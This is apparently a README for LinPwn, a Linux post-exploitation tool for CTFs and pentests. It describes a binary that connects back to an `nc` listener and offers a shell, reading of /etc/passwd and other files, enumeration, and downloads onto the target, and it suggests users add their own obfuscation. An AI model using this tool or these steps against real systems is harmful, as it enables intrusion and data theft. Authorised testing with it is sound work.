# LinPwn

![LinPwn](https://github.com/3XPL017/LinEnum/blob/master/images/LinPwn.png)
<br>
## About
LinPwn is a interactive tool created to assist you in post exploitation enumeration and privilege escalation.<br>
It was written in a way that it only works for you once it has been placed on the target machine so if you are doing a CTF or a pentest anyone else on the machine can not use it to get a shell of their own.<br>
Obfuscation is up to you - LinPwn was not written using any type of obfuscation to make it easy to read and build on top of it so anyone on the target machine will be able to see what it is doing and who it is connecting to. So if you want obfuscation you will have to obfuscate it yourself.<br>
## Connection
To get a connection you must set your IP and port you want it to connect to in the class Connection<br>
First you must place the LinPwn binary on the target machine<br>
Then you can simply run `nc -lvp PORT` on your machine and then run LinPwn on the target machine to get a connection.
## Usage
1. shell - This command Executes /bin/sh<br>
Example usage:`Shell> id`<br> 
Type exit to return to LinPwn.<br>
2. readfile - This command will print the contents of a file.<br>
Example usage: `ReadFile> /etc/passwd`<br>
Type exit to return to LinPwn.<br>
3. enumerate - this command runs LinEnum.sh
Example usage: `>>> enumerate` 
4. download - This command downloads a file on the target machine
Example usage: `Download> https://exampleurl.com/file_to_download`
## Compiling
I included a file called build.sh this is optional run `bash build.sh` to view the build options if you wish to use them. 
 
